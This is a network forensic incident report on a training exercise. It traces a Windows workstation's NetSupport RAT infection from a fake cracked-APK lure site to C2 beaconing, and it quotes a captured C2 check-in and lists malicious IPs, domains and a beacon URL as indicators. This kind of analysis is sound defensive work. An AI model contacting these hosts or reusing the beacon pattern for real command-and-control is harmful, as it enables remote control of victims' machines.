# Incident Report — Network Forensic Analysis
**Case:** MTA 2024-11-26 Traffic Analysis Exercise
**Evidence reviewed:** `2024-11-26-traffic-analysis-exercise.pcap` (26,922 frames, 20.85 MB, 3259.7s / ~54 min), `2024-11-26-traffic-analysis-exercise-alerts.txt` (Suricata/ET alert export), `2024-11-26-traffic-analysis-exercise-alerts.png`

## 1. Victim Host

| Field | Value | Source |
|---|---|---|
| IPv4 address | **10.11.26.183** | Conversations, ARP, all traffic |
| MAC address | **d0:57:7b:ce:fc:8b** | ARP (`10.11.26.183 → d0:57:7b:ce:fc:8b`) |
| Windows hostname | **DESKTOP-B8TQK49** | NBNS (`DESKTOP-B8TQK49<00>`, `<20>`) |
| AD/domain names | NetBIOS domain `NEMOTODES`, DNS domain `nemotodes.health` | NBNS (`NEMOTODES<00>`, `NEMOTODES<1e>`), LDAP baseObject (`DC=nemotodes,DC=health`) |
| Logged-in user | **oboomwald** (Oliver Q. Boomwald) | Kerberos `CNameString=oboomwald`; LDAP result `CN=Oliver Q.. Boomwald,CN=Users,DC=nemotodes,DC=health` |

Domain controller for context (not the victim): **10.11.26.3**, hostname `NEMOTODE-DC`, MAC `00:24:e8:7f:09:5d`. LAN gateway: `10.11.26.1` (MAC `00:17:e0:b8:29:5e`).

## 2. Malware Family

**NetSupport RAT** (abuse of the legitimate NetSupport Manager remote-control client as a commodity RAT).

**Attribution: signature-confirmed**, on two independent levels:
1. **IDS signatures** — `ETPRO TROJAN NetSupport RAT CnC Activity`, `ETPRO TROJAN Malicious NetSupport Rat CnC Checkin`, `ET INFO NetSupport Remote Admin Checkin`, `ET INFO NetSupport Remote Admin Response`, `ET POLICY NetSupport GeoLocation Lookup Request` — all fired against `10.11.26.183 ↔ 194.180.191.64`.
2. **Protocol-level confirmation** — following the TCP stream to the C2 host shows literal NetSupport headers:
   ```
   POST http://194.180.191.64/fakeurl.htm HTTP/1.1
   User-Agent: NetSupport Manager/1.3
   ...
   CMD=POLL
   INFO=1
   ACK=1

   HTTP/1.1 200 OK
   Server: NetSupport Gateway/1.8 (Windows NT)
   CMD=ENCD
   ES=1
   DATA=<encrypted binary>
   ```

## 3. Timeline

| Time (UTC) | Event |
|---|---|
| 04:49:38 | Capture start; baseline Windows/AD/OS traffic |
| 04:50:14 | Victim connects via TLS to `modandcrackedapk.com` (193.42.38.139), preceded seconds earlier by DNS lookups to `classicgrand.com` and `confirmsubscription.com` — consistent with a fake cracked-software/mod-APK lure/redirect chain. ET flags this as `ZPHP Domain in DNS Lookup` / `in TLS SNI` |
| 04:50:45 | NetSupport RAT client activates: geolocation lookup to `geo.netsupportsoftware.com` (104.26.1.231:80), immediately followed by first C2 checkin to **194.180.191.64:443** |
| 04:50:45 – 05:44 (capture end) | Persistent C2 beaconing: 58 `POST /fakeurl.htm` requests to 194.180.191.64, roughly every 60 seconds, for the remainder of the capture (~52 min) |

The initial payload transfer from `modandcrackedapk.com` occurs entirely inside a TLS 1.2/1.3 session (server completes with TLS 1.3 Application Data); no decryption keys are available, so the dropped executable's contents/hash **cannot be extracted from this capture**. No cleartext `.exe`/`.zip`/`.msi`/`.dll` transfer is visible anywhere in the pcap.

## 4. Indicators of Compromise

**Command-and-control:**
- `194.180.191.64:443` — NetSupport RAT C2 (plaintext HTTP over port 443, not real TLS; server banner `NetSupport Gateway/1.8`)

**Malicious/lure domains (grounded in DNS + TLS SNI):**
- `modandcrackedapk.com` → resolves to `193.42.38.139` — fake cracked-software/mod-APK lure site, ZPHP-flagged, TLS SNI observed
- `confirmsubscription.com` → resolves to `52.8.34.0`, `13.56.30.207` — redirect/gate domain in the delivery chain
- `classicgrand.com` → resolves to `213.246.109.5` — redirect/gate domain preceding the lure

**Malicious URL:**
- `http://194.180.191.64/fakeurl.htm` — C2 checkin/beacon endpoint (`CMD=POLL`, `CMD=ENCD` with encrypted `DATA=` payload)

**Associated NetSupport infrastructure (not itself malicious, but part of the RAT's operation on this host, kept separate as context):**
- `geo.netsupportsoftware.com` → `104.26.1.231:80`, `GET /location/loca.asp` — NetSupport's built-in geolocation lookup, vendor-owned infrastructure

**Files/hashes:** No malicious file transfer was captured in the clear. HTTP objects extracted from the pcap are all benign OS/browser/AD telemetry (`connecttest.txt`, `ProcessMAU.txt` from Adobe, OCSP responder blob, CRL `.cab` files) or the tiny (22–306 byte) `fakeurl.htm` C2 poll/response bodies — none represent a delivered payload, so no SHA256 for the dropper is reportable from this evidence.

**Benign context, not IOCs (noted for completeness, not attributed to the intrusion):**
- `ETPRO POLICY [MS-EFSR] EfsRpcOpenFileRaw` and `GPL NETBIOS SMB` alerts at 04:50:10, both `10.11.26.183 → 10.11.26.3` (the domain controller) — internal client/DC SMBv1/EFSRPC chatter. No evidence in this single-host capture of NTLM relay or further lateral movement; treated as routine/ambiguous AD traffic, not confirmed malicious.

## 5. Summary

Workstation **DESKTOP-B8TQK49** (10.11.26.183, MAC d0:57:7b:ce:fc:8b), logged in as domain user **oboomwald**, was infected with **NetSupport RAT** after browsing a fake cracked-software/mod-APK site (`modandcrackedapk.com`, 193.42.38.139) reached through a `classicgrand.com` → `confirmsubscription.com` redirect chain. Roughly 30 seconds after that connection, the host began beaconing to C2 at **194.180.191.64:443** using the real NetSupport Manager client (`User-Agent: NetSupport Manager/1.3`), polling every ~60 seconds for the rest of the capture. The actual dropped executable could not be recovered because its delivery occurred inside an encrypted TLS session.
